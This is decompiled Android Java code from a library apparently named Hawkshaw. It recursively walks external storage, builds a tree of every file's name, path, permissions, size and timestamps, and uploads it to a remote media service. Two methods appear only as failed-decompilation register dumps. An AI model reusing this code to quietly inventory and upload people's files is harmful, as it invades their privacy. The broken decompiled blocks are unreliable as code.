package com.hawkshaw.library.features.media.files;

import X2.k;
import X2.l;
import X2.o;
import Y1.K;
import android.webkit.MimeTypeMap;
import com.hawkshaw.library.datalayer.models.AppFile;
import com.hawkshaw.library.datalayer.models.Directory;
import com.hawkshaw.library.ktextensions.CollectionsKt;
import com.hawkshaw.library.ktextensions.NumbersKt;
import java.io.File;
import java.util.ArrayList;
import java.util.List;

public final class FileExplorerWalkKt {
    private static final String TAG = "FileExplorerWalk";

    /* JADX WARNING: Code restructure failed: missing block: B:4:0x001d, code lost:
        r5 = r5.getPath();
     */
    /* Code decompiled incorrectly, please refer to instructions dump. */
    private static final com.hawkshaw.library.datalayer.models.Directory getFileTree() {
        /*
            com.hawkshaw.library.App$Companion r0 = com.hawkshaw.library.App.Companion
            android.content.Context r0 = r0.getContext()
            r1 = 0
            java.io.File[] r0 = r0.getExternalFilesDirs(r1)
            java.lang.String r2 = "getExternalFilesDirs(...)"
            Y1.K.m(r0, r2)
            java.util.ArrayList r2 = new java.util.ArrayList
            r2.<init>()
            int r3 = r0.length
            r4 = 0
        L_0x0017:
            if (r4 >= r3) goto L_0x0033
            r5 = r0[r4]
            if (r5 == 0) goto L_0x002a
            java.lang.String r5 = r5.getPath()
            if (r5 == 0) goto L_0x002a
            java.lang.String r6 = "Android"
            java.lang.String r5 = r3.j.q0(r5, r6)
            goto L_0x002b
        L_0x002a:
            r5 = r1
        L_0x002b:
            if (r5 == 0) goto L_0x0030
            r2.add(r5)
        L_0x0030:
            int r4 = r4 + 1
            goto L_0x0017
        L_0x0033:
            java.util.ArrayList r0 = new java.util.ArrayList
            r3 = 10
            int r4 = X2.l.L0(r2, r3)
            r0.<init>(r4)
            java.util.Iterator r2 = r2.iterator()
        L_0x0042:
            boolean r4 = r2.hasNext()
            if (r4 == 0) goto L_0x0057
            java.lang.Object r4 = r2.next()
            java.lang.String r4 = (java.lang.String) r4
            java.io.File r5 = new java.io.File
            r5.<init>(r4)
            r0.add(r5)
            goto L_0x0042
        L_0x0057:
            com.hawkshaw.library.App$Companion r2 = com.hawkshaw.library.App.Companion
            android.content.Context r2 = r2.getContext()
            java.io.File r2 = r2.getExternalFilesDir(r1)
            java.io.File[] r2 = new java.io.File[]{r2}
            java.util.Collection r0 = com.hawkshaw.library.ktextensions.CollectionsKt.plusSafe(r0, r2)
            java.lang.Iterable r0 = (java.lang.Iterable) r0
            java.util.ArrayList r4 = new java.util.ArrayList
            int r2 = X2.l.L0(r0, r3)
            r4.<init>(r2)
            java.util.Iterator r2 = r0.iterator()
        L_0x0078:
            boolean r3 = r2.hasNext()
            if (r3 == 0) goto L_0x00a4
            java.lang.Object r3 = r2.next()
            java.io.File r3 = (java.io.File) r3
            java.lang.String r5 = r3.getName()
            java.lang.String r3 = getSpace(r3)
            java.lang.StringBuilder r6 = new java.lang.StringBuilder
            r6.<init>()
            r6.append(r5)
            java.lang.String r5 = "-"
            r6.append(r5)
            r6.append(r3)
            java.lang.String r3 = r6.toString()
            r4.add(r3)
            goto L_0x0078
        L_0x00a4:
            r7 = 0
            r8 = 0
            java.lang.String r5 = " | "
            r6 = 0
            r9 = 62
            java.lang.String r12 = X2.o.X0(r4, r5, r6, r7, r8, r9)
            long r15 = java.lang.System.currentTimeMillis()
            java.util.ArrayList r2 = new java.util.ArrayList
            r2.<init>()
            java.util.Iterator r0 = r0.iterator()
        L_0x00bc:
            boolean r3 = r0.hasNext()
            if (r3 == 0) goto L_0x00da
            java.lang.Object r3 = r0.next()
            java.io.File r3 = (java.io.File) r3
            boolean r4 = r3.canRead()
            if (r4 == 0) goto L_0x00d3
            com.hawkshaw.library.datalayer.models.Directory r3 = walk(r3)
            goto L_0x00d4
        L_0x00d3:
            r3 = r1
        L_0x00d4:
            if (r3 == 0) goto L_0x00bc
            r2.add(r3)
            goto L_0x00bc
        L_0x00da:
            com.hawkshaw.library.datalayer.models.Directory r0 = new com.hawkshaw.library.datalayer.models.Directory
            r14 = 0
            r17 = 0
            java.lang.String r11 = "FileExplorer Walk"
            r13 = 1
            r10 = r0
            r18 = r2
            r10.<init>(r11, r12, r13, r14, r15, r17, r18)
            F3.b r1 = com.hawkshaw.library.datalayer.network.twirp.interceptors.ContentNegotiationInterceptorKt.getJson()
            r1.getClass()
            com.hawkshaw.library.datalayer.models.Directory$Companion r2 = com.hawkshaw.library.datalayer.models.Directory.Companion
            kotlinx.serialization.KSerializer r2 = r2.serializer()
            java.lang.String r1 = r1.b(r2, r0)
            com.hawkshaw.library.ktextensions.LargeMessageLogger r2 = com.hawkshaw.library.ktextensions.LargeMessageLogger.INSTANCE
            java.lang.String r3 = "FileExplorerWalk"
            r2.v(r3, r1)
            return r0
        */
        throw new UnsupportedOperationException("Method not decompiled: com.hawkshaw.library.features.media.files.FileExplorerWalkKt.getFileTree():com.hawkshaw.library.datalayer.models.Directory");
    }

    private static final String getSpace(File file) {
        long usableSpace = file.getUsableSpace();
        long totalSpace = file.getTotalSpace();
        double gb = NumbersKt.toGB(totalSpace - usableSpace);
        double gb2 = NumbersKt.toGB(totalSpace);
        return gb + "/ " + gb2 + " GB";
    }

    private static final List<File> listAllFiles(File file) {
        File[] listFiles = file.listFiles();
        if (listFiles == null) {
            return null;
        }
        ArrayList arrayList = new ArrayList();
        for (File file2 : listFiles) {
            if (file2.isFile()) {
                arrayList.add(file2);
            }
        }
        return CollectionsKt.nullIfEmpty(o.h1(arrayList));
    }

    private static final List<File> listDirectories(File file) {
        File[] listFiles = file.listFiles();
        if (listFiles == null) {
            return null;
        }
        ArrayList arrayList = new ArrayList();
        for (File file2 : listFiles) {
            if (!file2.isFile()) {
                arrayList.add(file2);
            }
        }
        return CollectionsKt.nullIfEmpty(o.h1(arrayList));
    }

    /* JADX WARNING: type inference failed for: r0v4, types: [c3.c] */
    /* JADX WARNING: Multi-variable type inference failed */
    /* JADX WARNING: Removed duplicated region for block: B:12:0x002f  */
    /* JADX WARNING: Removed duplicated region for block: B:8:0x0021  */
    /* Code decompiled incorrectly, please refer to instructions dump. */
    public static final java.lang.Object pushFileExplorerWalk(a3.e r6) {
        /*
            boolean r0 = r6 instanceof P1.a
            if (r0 == 0) goto L_0x0013
            r0 = r6
            P1.a r0 = (P1.a) r0
            int r1 = r0.f1621E
            r2 = -2147483648(0xffffffff80000000, float:-0.0)
            r3 = r1 & r2
            if (r3 == 0) goto L_0x0013
            int r1 = r1 - r2
            r0.f1621E = r1
            goto L_0x0018
        L_0x0013:
            P1.a r0 = new P1.a
            r0.<init>(r6)
        L_0x0018:
            java.lang.Object r6 = r0.f1620D
            b3.a r1 = b3.C0298a.f4140D
            int r2 = r0.f1621E
            r3 = 1
            if (r2 == 0) goto L_0x002f
            if (r2 != r3) goto L_0x0027
            Y1.C0110h.P(r6)
            goto L_0x004e
        L_0x0027:
            java.lang.IllegalStateException r6 = new java.lang.IllegalStateException
            java.lang.String r0 = "call to 'resume' before 'invoke' with coroutine"
            r6.<init>(r0)
            throw r6
        L_0x002f:
            Y1.C0110h.P(r6)
            com.hawkshaw.library.datalayer.models.Directory r6 = getFileTree()
            com.hawkshaw.library.datalayer.Injector$Companion r2 = com.hawkshaw.library.datalayer.Injector.Companion
            com.hawkshaw.library.datalayer.Injector r2 = r2.getInstance()
            com.hawkshaw.library.datalayer.network.service.MediaService r2 = r2.getMediaService()
            com.hawkshaw.library.datalayer.models.PushFileExplorerWalkRequest r4 = new com.hawkshaw.library.datalayer.models.PushFileExplorerWalkRequest
            r4.<init>(r6)
            r0.f1621E = r3
            java.lang.Object r6 = r2.pushFileExplorerWalk(r4, r0)
            if (r6 != r1) goto L_0x004e
            return r1
        L_0x004e:
            com.hawkshaw.library.datalayer.network.twirp.ApiResponse r6 = (com.hawkshaw.library.datalayer.network.twirp.ApiResponse) r6
            com.hawkshaw.library.logger.Logger r0 = com.hawkshaw.library.logger.Logger.INSTANCE
            java.lang.String r1 = r6.getState()
            java.lang.String r2 = "PushFileExplorerWalk: "
            java.lang.String r2 = i.C0528x.h(r2, r1)
            r4 = 4
            r5 = 0
            java.lang.String r1 = "FileExplorerWalk"
            r3 = 0
            com.hawkshaw.library.logger.Logger.d$default(r0, r1, r2, r3, r4, r5)
            return r6
        */
        throw new UnsupportedOperationException("Method not decompiled: com.hawkshaw.library.features.media.files.FileExplorerWalkKt.pushFileExplorerWalk(a3.e):java.lang.Object");
    }

    private static final AppFile toAppFile(File file) {
        String name = file.getName();
        K.m(name, "getName(...)");
        String path = file.getPath();
        K.m(path, "getPath(...)");
        return new AppFile(name, path, MimeTypeMap.getSingleton().getMimeTypeFromExtension(k.M(file)), file.canRead(), file.canWrite(), file.lastModified(), file.length());
    }

    private static final Directory walk(File file) {
        ArrayList arrayList;
        ArrayList arrayList2;
        String name = file.getName();
        K.m(name, "getName(...)");
        String path = file.getPath();
        K.m(path, "getPath(...)");
        boolean canRead = file.canRead();
        boolean canWrite = file.canWrite();
        long lastModified = file.lastModified();
        List<File> listAllFiles = listAllFiles(file);
        if (listAllFiles != null) {
            Iterable<File> iterable = listAllFiles;
            arrayList = new ArrayList(l.L0(iterable, 10));
            for (File appFile : iterable) {
                arrayList.add(toAppFile(appFile));
            }
        } else {
            arrayList = null;
        }
        List<File> listDirectories = listDirectories(file);
        if (listDirectories != null) {
            ArrayList arrayList3 = new ArrayList();
            for (File file2 : listDirectories) {
                Directory walk = file2.canRead() ? walk(file2) : null;
                if (walk != null) {
                    arrayList3.add(walk);
                }
            }
            arrayList2 = arrayList3;
        } else {
            arrayList2 = null;
        }
        return new Directory(name, path, canRead, canWrite, lastModified, arrayList, arrayList2);
    }
}
